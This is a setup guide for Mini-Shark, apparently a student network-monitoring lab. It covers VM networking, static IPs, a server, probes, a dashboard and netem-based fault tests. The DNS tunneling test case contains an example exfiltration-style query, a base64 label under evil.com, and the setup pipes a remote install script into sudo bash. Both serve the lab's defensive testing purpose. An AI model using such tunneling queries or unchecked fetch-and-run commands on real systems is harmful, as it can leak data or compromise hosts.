# Mini-Shark — VM Network Topology & Setup Guide

**Laptop 1 (Windows 11 Host) — You have this ready**
**Subnet: 192.168.1.0/24 — Bridged networking on all VMs**

---

## Network Topology (What we are building)

```
                    ┌─────────────────────────────────────┐
                    │     Physical Wi-Fi Router            │
                    │     192.168.1.1 (Gateway)            │
                    └──────────────┬──────────────────────┘
                                   │  192.168.1.0/24
           ┌───────────────────────┼────────────────────────┐
           │                       │                        │
    ┌──────┴──────────────┐ ┌──────┴──────────────┐        │
    │  LAPTOP 1           │ │  LAPTOP 2            │        │
    │  Windows 11 Host    │ │  Arch Linux Host     │        │
    │                     │ │  (later)             │        │
    │  ┌───────────────┐  │ │  ┌───────────────┐  │        │
    │  │ VM 1 (Ubuntu) │  │ │  │ VM 4 (Ubuntu) │  │        │
    │  │ 192.168.1.50  │  │ │  │ 192.168.1.61  │  │        │
    │  │ CENTRAL HUB   │  │ │  │ PROBE 2       │  │        │
    │  │ E3+E4+API     │  │ │  │               │  │        │
    │  │ port 8001     │  │ │  └───────────────┘  │        │
    │  │ port 9000     │  │ └─────────────────────┘        │
    │  └───────────────┘  │                                 │
    │  ┌───────────────┐  │                                 │
    │  │ VM 2 (Ubuntu) │  │                                 │
    │  │ 192.168.1.51  │  │                                 │
    │  │ PROBE 1       │  │                                 │
    │  │ sends traffic │  │                                 │
    │  └───────────────┘  │                                 │
    └─────────────────────┘                                 │
```

**For now (Laptop 1 only) — VM1 + VM2 is enough to test everything**

---

## Step 1 — Configure VMs in VirtualBox/VMware (Bridged Network)

On Laptop 1, for **each VM**:
- Settings → Network → Adapter 1
- Attached to: **Bridged Adapter**
- Name: your Wi-Fi adapter (e.g. `Intel Wi-Fi 6`)

This gives each VM a real IP on your router's subnet — they can all talk to each other and to the host.

---

## Step 2 — Set static IPs on each Ubuntu VM

**On VM 1 (Central Hub — 192.168.1.50):**
```bash
sudo nano /etc/netplan/00-installer-config.yaml
```
```yaml
network:
  version: 2
  ethernets:
    ens33:
      dhcp4: no
      addresses: [192.168.1.50/24]
      gateway4: 192.168.1.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]
```
```bash
sudo netplan apply
ping 192.168.1.1   # verify gateway reachable
```

**On VM 2 (Probe 1 — 192.168.1.51):**
```yaml
      addresses: [192.168.1.51/24]
```

**Verify both VMs can see each other:**
```bash
# From VM 2
ping 192.168.1.50   # must reply
```

---

## Step 3 — Install dependencies on both VMs

```bash
# Run on BOTH VM 1 and VM 2
sudo apt update && sudo apt install -y python3 python3-pip python3-venv git

git clone https://github.com/HrishiiLit/Mini_Shark.git
cd Mini_Shark
git checkout integration

python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install scapy

# Give Python permission to capture packets without sudo
sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)
```

**On VM 1 only (for the dashboard):**
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs
cd Mini_Shark/frontend
npm install
```

---

## Step 4 — Open firewall ports on VM 1

```bash
sudo ufw allow 9000/tcp   # E3 probe telemetry
sudo ufw allow 8001/tcp   # FastAPI + WebSocket
sudo ufw allow 5173/tcp   # React dashboard
sudo ufw enable
```

---

## Step 5 — Start everything (Execution Order)

### VM 1 — Start Central Server (Terminal 1)

```bash
cd ~/Mini_Shark
source .venv/bin/activate
python3 -m uvicorn backend.main:app --host 0.0.0.0 --port 8001
```

You will see:
```
[E3] TCP ingestion server listening on 0.0.0.0:9000
[API] REST + WebSocket available on port 8001
INFO: Uvicorn running on http://0.0.0.0:8001
```

### VM 1 — Start React Dashboard (Terminal 2)

```bash
cd ~/Mini_Shark/frontend
VITE_API_HOST=http://192.168.1.50:8001 npm run dev -- --host 0.0.0.0
```

### VM 2 — Start Probe 1 (Terminal 1)

```bash
cd ~/Mini_Shark
source .venv/bin/activate
python3 run_probe.py --probe-id 1 --server 192.168.1.50:9000
```

### VM 1 — Start Probe 2 (Terminal 3)

```bash
cd ~/Mini_Shark
source .venv/bin/activate
python3 run_probe.py --probe-id 2 --server 127.0.0.1:9000
```

### Open Dashboard

On your **Windows host browser**:
```
http://192.168.1.50:5173
```

---

## Step 6 — Run the 4 Test Cases

### TC-01: Baseline Clean Transit

```bash
# On VM 2 (Probe 1 machine)
ping -c 20 192.168.1.50
curl http://192.168.1.50:8001/health
```

**Expected on dashboard:**
- Rows appear green/purple — MATCHED
- ΔT = 1–5ms
- Loss Rate = 0%

---

### TC-02: Silent Packet Drop (15% loss)

```bash
# On VM 1 — inject 15% packet loss
sudo tc qdisc add dev ens33 root netem loss 15%

# On VM 2 — generate traffic
ping -c 30 192.168.1.50

# After test — remove the rule
sudo tc qdisc del dev ens33 root
```

**Expected on dashboard:**
- Red rows — UNMATCHED / SILENT DROP
- Loss Rate jumps to ~15%
- PACKET_LOSS alert fires

---

### TC-03: Bufferbloat / Delay Spike

```bash
# On VM 1 — add 75ms delay with 15ms jitter
sudo tc qdisc add dev ens33 root netem delay 75ms 15ms

# On VM 2 — generate traffic
curl http://192.168.1.50:8001/health
ping -c 20 192.168.1.50

# After test — remove
sudo tc qdisc del dev ens33 root
```

**Expected on dashboard:**
- Amber rows — HIGH_LATENCY
- Live latency chart spikes to ~75ms
- BUFFERBLOAT alert fires

---

### TC-04: DNS Covert Tunneling

```bash
# On VM 2 — send high-entropy DNS query
python3 test_anomalies.py

# Or manually with nslookup
nslookup aW5maWx0cmF0aW9uX2tleQ==.evil.com 192.168.1.50
```

**Expected on dashboard:**
- DNS row shows ⚠ icon
- DNS_EXFIL_SUSPECTED alert fires
- H(X) = 4.4+ shown

---

## Summary — What runs where

| Machine | VM | IP | What runs | Port |
|---------|----|----|-----------|------|
| Laptop 1 | VM 1 | 192.168.1.50 | Central Server (E3+E4+API+Dashboard) | 8001, 9000, 5173 |
| Laptop 1 | VM 2 | 192.168.1.51 | Probe 1 (E1+E2+telemetry sender) | — |
| Laptop 1 | Windows Host | 192.168.1.x | Browser to view dashboard | — |
| Laptop 2 | VM 4 | 192.168.1.61 | Probe 2 (when ready) | — |

---

## Quick verify commands

```bash
# From VM 2 — is the server up?
curl http://192.168.1.50:8001/health
# Expected: {"status":"ok",...}

# Is port 9000 open?
nc -zv 192.168.1.50 9000
# Expected: Connection to 192.168.1.50 9000 port [tcp] succeeded

# Check probes connected (from VM 1)
curl http://127.0.0.1:8001/status
```
